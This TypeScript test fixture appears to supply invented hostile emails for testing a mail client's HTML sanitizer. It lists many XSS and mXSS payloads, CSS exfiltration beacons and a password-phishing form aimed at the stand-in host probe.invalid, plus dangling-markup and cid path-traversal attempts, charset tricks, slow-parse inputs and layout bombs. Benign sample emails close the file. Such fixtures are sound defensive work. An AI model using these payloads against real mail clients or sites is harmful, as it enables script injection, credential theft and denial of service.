// Invented hostile emails. Each is what an attacker could put in text/html; `lock` says what it tries.
// Every address and domain is reserved for examples. probe.invalid stands for the attacker's server: a request
// to it is what the browser tests look for. No real email belongs here.
export const PROBE = "https://probe.invalid";

export type HostileEmail = { name: string; html: string };

const fire = `parent.postMessage({jinboxEmail:location.hash.slice(1),type:"height",height:9999},"*");document.title="pwned";new Image().src="${PROBE}/script-ran";alert(1)`;
const ATTR = fire.replace(/"/g, "&quot;");

export const HOSTILE_EMAILS: readonly HostileEmail[] = [
  // ---- script tags, in many spellings
  { name: "script plain", html: `<p>hi</p><script>${fire}</script>` },
  { name: "script upper", html: `<SCRIPT>${fire}</SCRIPT>` },
  { name: "script mixed case and slash", html: `<ScRiPt/x>${fire}</sCrIpT >` },
  { name: "script with newline in tag", html: `<script\n type="text/javascript"\n>${fire}</script\n>` },
  { name: "script src", html: `<script src="${PROBE}/script-src.js"></script>` },
  { name: "script split by a removed tag", html: `<scr<script>ipt>${fire}</scr</script>ipt>` },
  { name: "tag joined by removing a script", html: `<<script></script>img src=x onerror="${ATTR}">` },
  { name: "script split by a comment", html: `<scr<!-- -->ipt>${fire}</script>` },
  { name: "script with NUL in its name", html: `<scr\u0000ipt>${fire}</scr\u0000ipt>` },
  { name: "script after a stray end tag", html: `</script><script>${fire}</script>` },
  { name: "script in a table", html: `<table><script>${fire}</script><tr><td>x</td></tr></table>` },
  { name: "unclosed script", html: `<p>before</p><script>${fire}` },
  // ---- event handlers
  { name: "img onerror", html: `<img src=x onerror="${ATTR}">` },
  { name: "img onerror, slashes for spaces", html: `<img/src=x/onerror="${ATTR}">` },
  { name: "img onload with a real picture", html: `<img src="https://images.example/a.png" onload="${ATTR}">` },
  { name: "upper-case handler", html: `<p ONCLICK="${ATTR}" OnMouseOver="${ATTR}">x</p>` },
  { name: "handler written twice", html: `<div onclick="1" onclick="${ATTR}" ONCLICK="${ATTR}">x</div>` },
  { name: "body onload", html: `<body onload="${ATTR}">x</body>` },
  { name: "details ontoggle", html: `<details open ontoggle="${ATTR}">x</details>` },
  { name: "autofocus onfocus", html: `<a href="https://ok.example/" autofocus tabindex=1 onfocus="${ATTR}">x</a><input autofocus onfocus="${ATTR}">` },
  { name: "marquee onstart", html: `<marquee onstart="${ATTR}">x</marquee>` },
  { name: "video and audio onerror", html: `<video src=x onerror="${ATTR}"></video><audio src=x onerror="${ATTR}"></audio><video><source onerror="${ATTR}"></video>` },
  { name: "odd attribute names", html: `<a "onclick="${ATTR}" 'onfocus=1 =onmouseover=1 href="https://ok.example/">x</a>` },
  // ---- links
  { name: "javascript link", html: `<a href="javascript:${ATTR}">click</a>` },
  { name: "javascript link, entities", html: `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>` },
  { name: "javascript link, hex and no semicolons", html: `<a href="&#x6a;avascript&#x3a;alert(1)">a</a><a href="&#106avascript:alert(1)">b</a>` },
  { name: "javascript link, named entities", html: `<a href="javascript&colon;alert(1)">a</a><a href="java&Tab;script:alert(1)">b</a><a href="java&NewLine;script:alert(1)">c</a>` },
  { name: "javascript link, whitespace and controls", html: `<a href="  javascript:alert(1)">a</a><a href="java\tscript:alert(1)">b</a><a href="java\nscript:alert(1)">c</a><a href="\u0001javascript:alert(1)">d</a>` },
  { name: "javascript link, mixed case", html: `<a href="JaVaScRiPt:alert(1)">x</a>` },
  { name: "vbscript and file links", html: `<a href="vbscript:msgbox(1)">a</a><a href="file:///etc/passwd">b</a><a href="ftp://probe.invalid/x">c</a>` },
  { name: "data link", html: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a><a href="DATA:text/html,<script>alert(1)</script>">y</a>` },
  { name: "link with a password in it", html: `<a href="https://bank.example@probe.invalid/">bank</a>` },
  { name: "javascript and svg as images", html: `<img src="javascript:alert(1)"><img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"><img src="data:text/html,<script>alert(1)</script>">` },
  // ---- SVG and MathML
  { name: "svg onload", html: `<svg onload="${ATTR}"></svg>` },
  { name: "svg with script inside", html: `<svg><script>${fire}</script></svg>` },
  { name: "svg animate", html: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>x</text></a></svg>` },
  { name: "svg use", html: `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='x' onerror='alert(1)'/></svg>#x"/></svg>` },
  { name: "unclosed svg", html: `<p>before</p><svg onload="${ATTR}"><p>after</p>` },
  { name: "math link", html: `<math><a xlink:href="javascript:alert(1)">x</a></math>` },
  { name: "math mglyph mXSS", html: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">` },
  // ---- other documents and navigation
  { name: "meta refresh", html: `<meta http-equiv="refresh" content="0;url=${PROBE}/meta-refresh"><p>x</p>` },
  { name: "base href", html: `<base href="${PROBE}/"><a href="x">x</a><img src="y.png">` },
  { name: "base target", html: `<base target="_top"><a href="https://ok.example/">x</a>` },
  { name: "link stylesheet", html: `<link rel="stylesheet" href="${PROBE}/s.css"><link rel="import" href="${PROBE}/i.html">` },
  { name: "iframe, srcdoc", html: `<iframe srcdoc="<script>${ATTR}</script>"></iframe><iframe src="${PROBE}/frame"></iframe>` },
  { name: "object and embed", html: `<object data="${PROBE}/o"></object><embed src="${PROBE}/e"><applet code="x"></applet>` },
  { name: "frameset", html: `<frameset onload="${ATTR}"><frame src="${PROBE}/f"></frameset>` },
  { name: "target top link", html: `<a href="https://ok.example/" target="_top">x</a><a href="https://ok.example/" target="_self">y</a><a href="https://ok.example/" rel="opener">z</a>` },
  // ---- forms
  { name: "form phishing", html: `<form action="${PROBE}/steal" method="post"><p>Your password expired</p><label>Password <input type="password" name="p" autofocus></label><button formaction="${PROBE}/steal2">Sign in</button><input type="submit" value="Sign in"></form>` },
  { name: "button outside a form", html: `<button form="f" formaction="${PROBE}/x">Go</button><select><option>a</option></select><textarea>t</textarea>` },
  // ---- CSS
  { name: "css @import", html: `<style>@import url(${PROBE}/import.css);@import "${PROBE}/import2.css";p{color:red}</style><p>x</p>` },
  { name: "css @font-face", html: `<style>@font-face{font-family:x;src:url(${PROBE}/font.woff)}p{font-family:x}</style><p>x</p>` },
  { name: "css url on a beacon's properties", html: `<style>p{cursor:url(${PROBE}/cursor),auto;mask:url(${PROBE}/mask);border-image:url(${PROBE}/bi);content:url(${PROBE}/content);filter:url(${PROBE}/f#a)}</style><p style="cursor:url(${PROBE}/inline-cursor),auto">x</p>` },
  { name: "css attribute-selector exfiltration", html: `<style>a[href^="https://secret"]{background:url(${PROBE}/leak-a)}a[href*="token=1"]{background:url(${PROBE}/leak-1)}[class~=x]{background:url(${PROBE}/leak-x)}</style><a href="https://secret.example/?token=1">x</a>` },
  { name: "css pseudo class beacon", html: `<style>a:hover{background:url(https://images.example/hover.png)}a:visited{background:url(${PROBE}/visited)}</style><a href="https://ok.example/">x</a>` },
  { name: "css expression and bindings", html: `<style>p{width:expression(alert(1));-moz-binding:url(${PROBE}/b.xml#x);behavior:url(${PROBE}/b.htc)}</style><p style="width:expression(alert(1));behavior:url(${PROBE}/c.htc)">x</p>` },
  { name: "css escapes", html: `<style>p{background:\\75\\72\\6c(${PROBE}/escaped)}p{background:u\\rl(${PROBE}/escaped2)}\\40import url(${PROBE}/escaped3);</style><p style="background:\\75rl(${PROBE}/escaped4)">x</p>` },
  { name: "css split by comments", html: `<style>p{background:u/**/rl(${PROBE}/comment)}@im/**/port url(${PROBE}/comment2);</style><p style="background:u/*x*/rl(${PROBE}/comment3)">x</p>` },
  { name: "css in entities", html: `<p style="background:u&#114;l(https://tracker.mailtrack.io/entity);background-image:&#117;rl(https://tracker.mailtrack.io/entity2);b&#101;havior:url(${PROBE}/entity3)">x</p>` },
  { name: "css javascript url", html: `<style>p{background:url(javascript:alert(1))}</style><p style="background:url('javascript:alert(1)');background-image:url(data:image/svg+xml,<svg onload=alert(1)>)">x</p>` },
  { name: "css image-set and var", html: `<style>:root{--x:url(${PROBE}/var)}p{background:var(--x);background-image:image-set("${PROBE}/set" 1x);background:cross-fade(url(${PROBE}/cf),url(${PROBE}/cf2),50%)}</style><p>x</p>` },
  { name: "style that closes itself", html: `<style>p{background:"</style><script>${fire}</script>"}</style><img src=x onerror="${ATTR}">` },
  { name: "style with markup in a string", html: `<style>p::before{content:"<img src=x onerror=alert(1)>"}</style><style>@media screen{</style><img src=x onerror="${ATTR}">` },
  { name: "style with CDATA and comments", html: `<style><![CDATA[p{color:red}]]><!-- p{background:url(${PROBE}/x)} --></style>` },
  { name: "unclosed style", html: `<p>before</p><style>p{color:red}` },
  { name: "css fixed overlay", html: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999">Fake sign-in</div>` },
  { name: "css grows with its frame", html: `<div style="height:200vh;min-height:150vmin">x</div><style>div{height:300dvh}</style>` },
  // ---- nested and malformed tags, mXSS
  { name: "noscript mXSS", html: `<noscript><p title="</noscript><img src=x onerror='${fire.replace(/'/g, '"')}'>"></noscript>` },
  { name: "title mXSS", html: `<title><img src=x onerror="${ATTR}"></title><p>x</p>` },
  { name: "textarea mXSS", html: `<textarea><img title="</textarea><img src=x onerror='alert(1)'>"></textarea>` },
  { name: "xmp, listing, plaintext", html: `<xmp><img src=x onerror=alert(1)></xmp><listing><img src=x onerror=alert(1)></listing><plaintext><img src=x onerror=alert(1)>` },
  { name: "noembed, noframes, iframe as raw text", html: `<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed><noframes><img title="</noframes><img src=x onerror=alert(1)>"></noframes><iframe><img title="</iframe><img src=x onerror=alert(1)>"></iframe>` },
  { name: "template", html: `<template><img src=x onerror="${ATTR}"></template><select><template><img src=x onerror=alert(1)></template></select>` },
  { name: "form in math in form", html: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>` },
  { name: "table foster parenting", html: `<table><a href="javascript:alert(1)"><tr><td><svg><desc><img src=x onerror=alert(1)></desc></svg></td></tr></a></table>` },
  { name: "comment tricks", html: `<!--><img src=x onerror="${ATTR}">--><!-- --!><img src=x onerror="${ATTR}"><!--[if IE]><script>${fire}</script><![endif]-->` },
  { name: "CDATA and processing instructions", html: `<![CDATA[<img src=x onerror="${ATTR}">]]><?xml version="1.0"?><?php echo 1 ?><!doctype html><!ELEMENT x>` },
  { name: "attribute that never ends", html: `<p>before</p><img src="https://images.example/a.png?` },
  { name: "tag that never ends", html: `<p>before</p><a href="https://ok.example/" onclick="alert(1)"` },
  { name: "dangling markup for what follows", html: `<img src='${PROBE}/dangling?` },
  { name: "comment that never ends", html: `<p>before</p><!-- all the rest` },
  { name: "broken quotes", html: `<a href="https://ok.example/"onclick="${ATTR}"x=">y</a><img src="https://images.example/a.png"onerror="${ATTR}">` },
  { name: "unquoted value with a tag in it", html: `<a href=https://ok.example/?a=<script>alert(1)</script>>x</a>` },
  { name: "lots of less-thans", html: `<<<<<<img src=x onerror=alert(1)>>>>><<<script>alert(1)<</script>` },
  { name: "custom elements and namespaces", html: `<x-a onclick="${ATTR}">x</x-a><o:p onclick=1>y</o:p><v:rect href="javascript:alert(1)">z</v:rect><xml><script>${fire}</script></xml>` },
  // ---- forged nonce and forged messages
  { name: "forged nonce", html: `<script nonce="AAAAAAAAAAAAAAAAAAAAAA">${fire}</script><script nonce>${fire}</script>` },
  { name: "forged end mark and forged ready", html: `<div id="jinbox-end" hidden></div><script>parent.postMessage({type:"ready"},"*");parent.postMessage({type:"key",key:"e",code:"KeyE"},"*")</script>` },
  { name: "name clobbering", html: `<img name="body"><img name="documentElement"><img name="getElementById"><form name="parent"><input name="postMessage"></form><a id="location" name="location">x</a>` },
  // ---- cid path traversal
  { name: "cid traversal", html: `<img src="cid:../../../../etc/passwd"><img src="cid:..%2F..%2Fsecret"><img src="cid:/etc/hosts"><img src="cid:not-in-this-message@probe.invalid">` },
  { name: "editable by keys", html: `<div style="-webkit-user-modify:read-write;user-modify:read-write">type here</div>` },
  { name: "height that follows its frame", html: `<style>@media (min-height:300px){.a{height:10px}}@media (max-height:299px){.a{height:1000px}}@media (orientation:portrait){.a{height:10px}}.a{height:1e2vh}</style><div class="a" style="height:1E2VH">x</div>` },
  // ---- trackers
  { name: "tracker pixel", html: `<p>x</p><img src="https://tracker.mailtrack.io/open.gif?u=1" width="1" height="1"><img src="https://u1.ct.sendgrid.net/wf/open?upn=2"><img src="${PROBE}/pixel.gif" width="1" height="1" alt=""><img src="${PROBE}/hidden.gif" style="display:none"><div style="display:none"><img src="${PROBE}/in-hidden.gif"></div><img src="${PROBE}/zero.gif" style="width:0;height:0">` },
];

/** What costs a sanitizer time, each about 100 KB, the size that froze the connector for a minute when it ran on the main thread. */
export const SLOW_EMAILS: readonly HostileEmail[] = [
  { name: "zeros in a style", html: `<img src="https://images.example/x.png" style="width:${"0".repeat(100_000)}x">` },
  { name: "zeros in a style on a div", html: `<div style="height:${"0".repeat(100_000)}x">y</div>` },
  { name: "digits in a style", html: `<img src="https://images.example/x.png" style="height:${"1".repeat(100_000)}x">` },
  { name: "digits in width", html: `<img src="https://images.example/x.png" width="${"1".repeat(100_000)}x">` },
  { name: "many attributes", html: `<div${Array.from({ length: 12_500 }, (_, i) => ` a${i.toString(36)}=1`).join("")}>x</div>` },
  { name: "the same attribute many times", html: `<div${" a=1".repeat(25_000)}>x</div>` },
  { name: "semicolons in a style", html: `<div style="${"b:c;".repeat(25_000)}">x</div>` },
  { name: "spaces in a style", html: `<div style="width:${" ".repeat(100_000)}0">x</div>` },
];

/** Layout bombs: no script, little text, and each can cost a browser's layout more than the last. Depth at the sanitizer's limit or past it. */
const nest = (open: string, close: string, n: number, inner = "x") => open.repeat(n) + inner + close.repeat(n);
export const LAYOUT_BOMBS: readonly HostileEmail[] = [
  { name: "columns, 40 deep", html: nest(`<div style="columns:2">`, "</div>", 40) },
  { name: "column-count, 40 deep", html: nest(`<div style="column-count:2;column-gap:0">`, "</div>", 40) },
  { name: "columns from a sheet", html: `<style>.m{columns:2}</style>${nest(`<div class="m">`, "</div>", 40)}` },
  { name: "content sizes in floats", html: nest(`<div style="float:left;width:max-content;columns:2">`, "</div>", 20) },
  { name: "floats at the depth limit", html: nest(`<div style="float:left;width:max-content">`, "</div>", 99) },
  { name: "grid at the depth limit", html: nest(`<div style="display:inline-grid;grid-template-columns:auto auto">`, "</div>", 99) },
  { name: "flex at the depth limit", html: nest(`<div style="display:flex;flex-direction:column;width:fit-content;height:min-content">`, "</div>", 99) },
  { name: "inline-flex rows at the depth limit", html: nest(`<div style="display:inline-flex;flex:1 1 auto">`, "</div>", 99) },
  { name: "nested tables at the depth limit", html: nest(`<table width="100%"><tr><td width="50%">`, "</td></tr></table>", 99) },
  { name: "nested tables with percent heights", html: nest(`<table height="100%" style="height:100%"><tr><td height="100%" style="height:100%">`, "</td></tr></table>", 99) },
  { name: "too deep", html: nest("<div>", "</div>", 59_000) },
  { name: "huge type", html: `<div style="font-size:99999px;line-height:99999px">${"x ".repeat(2000)}</div>` },
  { name: "huge type in rem", html: `<div style="font-size:9e9rem">x</div>` },
  { name: "zoom", html: nest(`<div style="zoom:2">`, "</div>", 60) },
  { name: "transforms", html: nest(`<div style="transform:scale(2) rotate(1deg);will-change:transform">`, "</div>", 60) },
  { name: "filters", html: nest(`<div style="filter:blur(50px) drop-shadow(0 0 99px red)">`, "</div>", 60) },
  { name: "large shadows", html: `<div style="box-shadow:0 0 5000px 5000px red;width:3000px;height:29000px;background:linear-gradient(red,blue)">x</div>`.repeat(20) },
  { name: "shadows at their limit", html: `<div style="box-shadow:0 0 200px 200px red,0 0 200px 200px blue;width:3000px;height:1000px">x</div>`.repeat(30) },
  { name: "many columns", html: `<div style="columns:1000;column-gap:0;width:100000px">${"x ".repeat(20_000)}</div>` },
  { name: "animations", html: `<style>@keyframes k{from{width:1px}to{width:9999px}}div{animation:k 1ms infinite}</style>${nest("<div>", "</div>", 60)}` },
];

/** Bytes of a text/html part in odd charsets: [charset, bytes, what must not get through]. */
export const ENCODED_EMAILS: readonly { name: string; charset: string; bytes: Uint8Array }[] = [
  // UTF-7, which a browser told nothing could once be made to read: a script in it.
  { name: "utf-7", charset: "utf-7", bytes: new TextEncoder().encode(`+ADw-script+AD4-alert(1)+ADw-/script+AD4-<p>x</p><script>alert(2)</script>`) },
  // UTF-16 with its BOM.
  { name: "utf-16le", charset: "utf-16le", bytes: Uint8Array.from([0xff, 0xfe, ...[...`<script>alert(1)</script><p>x</p><img src=x onerror=alert(1)>`].flatMap((c) => [c.charCodeAt(0), 0])]) },
  // Shift-JIS, whose lead bytes can swallow a quote in a careless reader: the 0x95 eats nothing here, and no handler survives.
  { name: "shift_jis", charset: "shift_jis", bytes: Uint8Array.from([0x3c, 0x61, 0x20, 0x74, 0x69, 0x74, 0x6c, 0x65, 0x3d, 0x22, 0x95, 0x22, 0x20, 0x6f, 0x6e, 0x63, 0x6c, 0x69, 0x63, 0x6b, 0x3d, 0x22, 0x61, 0x22, 0x3e, 0x78, 0x3c, 0x2f, 0x61, 0x3e]) },
  // ISO-2022-JP, whose escapes can hide a tag from a reader that does not decode it.
  { name: "iso-2022-jp", charset: "iso-2022-jp", bytes: new TextEncoder().encode(`\u001b$B%9\u001b(B<scr\u001b(Jipt>alert(1)</scr\u001b(Jipt><img src=x \u001b$B%9\u001b(Bonerror=alert(1)>`) },
  // An unknown charset, and bytes that are not valid in the one named.
  { name: "unknown charset", charset: "x-made-up", bytes: new TextEncoder().encode(`<script>alert(1)</script><p>x</p>`) },
  { name: "invalid utf-8", charset: "utf-8", bytes: Uint8Array.from([0x3c, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3e, 0xc0, 0xaf, 0xff, 0x3c, 0x2f, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3e, 0x3c, 0x70, 0x3e, 0x78, 0x3c, 0x2f, 0x70, 0x3e]) },
];

/** A realistic invented marketing email: tables, a 600px layout, a preheader, media queries, a tracker pixel, a footer. */
export const MARKETING_EMAIL = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Autumn at Fernhill Coffee</title>
<!--[if mso]><style>.fallback{font-family:Arial,sans-serif!important}</style><![endif]-->
<style type="text/css">
  body,table,td,a{-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}
  table,td{mso-table-lspace:0;mso-table-rspace:0}
  img{border:0;height:auto;line-height:100%;outline:none;text-decoration:none}
  a[x-apple-data-detectors]{color:inherit!important;text-decoration:none!important}
  .btn:hover{background:#7a4a24!important}
  @media screen and (max-width:620px){.h1{font-size:26px!important;line-height:32px!important}.pad{padding:18px!important}}
  @import url("https://fonts.example/css?family=Lora");
  @font-face{font-family:Lora;src:url(https://fonts.example/lora.woff2)}
</style>
</head>
<body style="margin:0;padding:0;background-color:#f3efe9">
<div style="display:none;max-height:0;overflow:hidden;mso-hide:all">New roast, free shipping this week. Open for 15% off your next bag.</div>
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f3efe9"><tr><td align="center" style="padding:24px 0">
  <table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0" style="width:600px;background:#ffffff;border-radius:6px">
    <tr><td align="center" style="padding:28px 0 12px"><a href="https://fernhill.example/?utm=logo"><img src="https://images.example/fernhill-logo.png" width="160" height="48" alt="Fernhill Coffee" style="display:block"></a></td></tr>
    <tr><td><a href="https://fernhill.example/autumn"><img src="https://images.example/autumn-hero.png" width="600" height="280" alt="Beans in autumn light" style="display:block;width:100%;height:auto"></a></td></tr>
    <tr><td class="pad" style="padding:32px 40px 8px;font-family:Georgia,'Times New Roman',serif">
      <h1 class="h1" style="margin:0 0 12px;font-size:32px;line-height:38px;color:#3b2a1e;font-weight:normal">The autumn roast is here</h1>
      <p style="margin:0 0 16px;font:16px/24px Arial,Helvetica,sans-serif;color:#51453c">Dark cherry, toasted hazelnut and a little smoke. Roasted on Monday, at your door by Thursday. Members get 15% off until Sunday, and shipping is on us this week.</p>
    </td></tr>
    <tr><td align="center" style="padding:8px 40px 32px"><a class="btn" href="https://fernhill.example/shop?campaign=autumn&amp;u=abc" style="display:inline-block;padding:14px 28px;background:#8c5a2e;color:#ffffff;border-radius:4px;font:bold 15px Arial,sans-serif;text-decoration:none">Shop the roast</a></td></tr>
    <tr><td style="padding:0 40px 32px">
      <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr>
        <td width="50%" valign="top" style="padding-right:10px"><img src="https://images.example/grinder.png" width="250" height="160" alt="A hand grinder" style="display:block;width:100%;height:auto;border-radius:4px"><p style="margin:10px 0 0;font:bold 14px Arial,sans-serif;color:#3b2a1e">Hand grinder</p><p style="margin:2px 0 0;font:14px Arial,sans-serif;color:#51453c">$48, back in stock</p></td>
        <td width="50%" valign="top" style="padding-left:10px"><img src="https://images.example/mug.png" width="250" height="160" alt="A stoneware mug" style="display:block;width:100%;height:auto;border-radius:4px"><p style="margin:10px 0 0;font:bold 14px Arial,sans-serif;color:#3b2a1e">Stoneware mug</p><p style="margin:2px 0 0;font:14px Arial,sans-serif;color:#51453c">$22, two colours</p></td>
      </tr></table>
    </td></tr>
    <tr><td style="padding:20px 40px;border-top:1px solid #eee4d9;font:12px/18px Arial,sans-serif;color:#8a7c70" align="center">Fernhill Coffee, 12 Example Road, Testville. <a href="https://fernhill.example/unsubscribe?u=abc" style="color:#8a7c70">Unsubscribe</a></td></tr>
  </table>
</td></tr></table>
<img src="https://links.fernhill.example/open/abc.gif" width="1" height="1" alt="" style="display:block">
<img src="https://u123.ct.sendgrid.net/wf/open?upn=abc" alt="">
</body></html>`;

/** An invented reply as Gmail writes it: a short answer over a folded history. */
export const REPLY_EMAIL = `<div dir="ltr">Thursday works, see you at the usual place.<br clear="all"><div><br></div>-- <br><div dir="ltr" class="gmail_signature">Sam</div></div><br><div class="gmail_quote gmail_quote_container"><div dir="ltr" class="gmail_attr">On Mon, Nov 2, 2026 at 9:14 AM Pat &lt;<a href="mailto:pat@example.com">pat@example.com</a>&gt; wrote:<br></div><blockquote class="gmail_quote" style="margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex"><div dir="ltr">Lunch on Thursday?</div></blockquote></div>`;
